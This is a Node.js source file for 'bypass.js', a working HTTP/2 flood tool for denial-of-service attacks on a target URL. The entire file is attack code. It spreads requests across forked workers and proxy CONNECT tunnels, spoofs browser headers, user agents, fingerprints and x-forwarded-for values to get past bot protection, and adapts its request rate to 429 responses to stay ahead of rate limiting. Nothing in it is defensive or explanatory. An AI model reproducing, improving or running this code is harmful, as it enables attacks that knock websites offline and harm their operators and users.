const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const axios = require('axios');
const https = require('https');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', (exception) => {});
process.on('unhandledRejection', (reason, promise) => {});

if (process.argv.length < 7) {
    console.log(`node bypass.js target time rate thread proxy.txt`);
    process.exit();
}

const targetURL = process.argv[2];
const parsedTarget = url.parse(targetURL);
let currentRate = ~~process.argv[4]; // Dinamis mengikuti feedback server

const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
};

function getTitleFromHTML(html) {
    const titleRegex = /<title>(.*?)<\/title>/i;
    const match = html.match(titleRegex);
    return (match && match[1]) ? match[1] : 'Not Found';
}

function getStatus() {
    const agent = new https.Agent({ rejectUnauthorized: false });
    axios.get(targetURL, { httpsAgent: agent, timeout: 5000 })
        .then((response) => {
            console.log(`[\x1b[35mBYPASS\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(response.data)} (\x1b[32m${response.status}\x1b[0m)`);
            if (currentRate < ~~process.argv[4]) currentRate += 5; // Perlahan naik kembali
        })
        .catch((error) => {
            const status = error.response ? error.response.status : "ERR";
            console.log(`[\x1b[35mBYPASS\x1b[0m] ${getCurrentTime()} Status: (\x1b[31m${status}\x1b[0m)`);
            if (status === 429) currentRate = Math.max(10, Math.floor(currentRate * 0.7)); // Turunkan rate 30% jika 429
        });
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== "");
}
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomString(len) { return crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len); }

const args = {
    target: targetURL,
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

if (cluster.isMaster) {
    console.clear();
    console.log(`\n\x1b[36mOverloadSecurity (Adaptive Rate Mode)\x1b[0m\n`);
    
    for (let i = 1; i <= args.threads; i++) {
        cluster.fork();
        console.log(`[\x1b[35mBYPASS\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
    }

    console.log(`[\x1b[35mBYPASS\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
    
    setInterval(getStatus, 2000);

    setTimeout(() => {
        console.log(`[\x1b[35mBYPASS\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
        process.exit(1);
    }, args.time * 1000);
} else {
    const proxies = readLines(args.proxyFile);
    setInterval(runFlooder, 1);

    function runFlooder() {
        const proxyAddr = randomElement(proxies);
        if (!proxyAddr) return;
        const [proxyHost, proxyPort] = proxyAddr.split(":");
        const ua = new UserAgent({ deviceCategory: 'desktop' }).toString();
        
        const screenRes = ["1920x1080", "2560x1440", "1366x768", "1440x900"][Math.floor(Math.random() * 4)];
        const gpu = ua.includes("Windows") ? "NVIDIA GeForce RTX " + (Math.random() > 0.5 ? "4070" : "3080") : "Apple M3 GPU";

        const headers = {
            ":method": "GET",
            ":path": parsedTarget.path + "?" + randomString(8) + "=" + randomString(12),
            ":scheme": "https",
            ":authority": parsedTarget.host,
            "user-agent": ua,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9,id;q=0.8",
            "accept-encoding": "gzip, deflate, br",
            "sec-ch-ua": '"Google Chrome";v="121", "Chromium";v="121", "Not:A-Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": ua.includes("Windows") ? '"Windows"' : '"macOS"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "x-fingerprint": `res=${screenRes}|gpu=${gpu}|sid=${randomString(16)}`,
            "x-forwarded-for": proxyHost,
            "upgrade-insecure-requests": "1",
            "cache-control": "no-cache",
            "referer": randomElement(["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"])
        };

        const connection = net.connect({ host: proxyHost, port: ~~proxyPort }, () => {
            connection.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
            
            connection.once("data", () => {
                const tlsConn = tls.connect({
                    socket: connection,
                    ALPNProtocols: ['h2'],
                    servername: parsedTarget.host,
                    rejectUnauthorized: false,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                    secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
                }, () => {
                    const client = http2.connect(parsedTarget.href, {
                        createConnection: () => tlsConn,
                        settings: { 
                            initialWindowSize: 6291456,
                            maxConcurrentStreams: 1000,
                            enablePush: false 
                        }
                    });

                    client.on("connect", () => {
                        const attackInterval = setInterval(() => {
                            for (let i = 0; i < currentRate; i++) {
                                const req = client.request(headers);
                                req.setPriority({ weight: Math.floor(Math.random() * 255), exclusive: true });
                                req.on("response", (res) => { 
                                    if(res[':status'] === 429) currentRate = Math.max(5, currentRate - 1);
                                    req.close(); req.destroy(); 
                                });
                                req.end();
                            }
                        }, 1000);

                        setTimeout(() => {
                            clearInterval(attackInterval);
                            client.destroy();
                            connection.destroy();
                        }, 10000);
                    });

                    client.on("error", () => {
                        client.destroy();
                        connection.destroy();
                    });
                });
            });
        });

        connection.on("error", () => { connection.destroy(); });
    }
}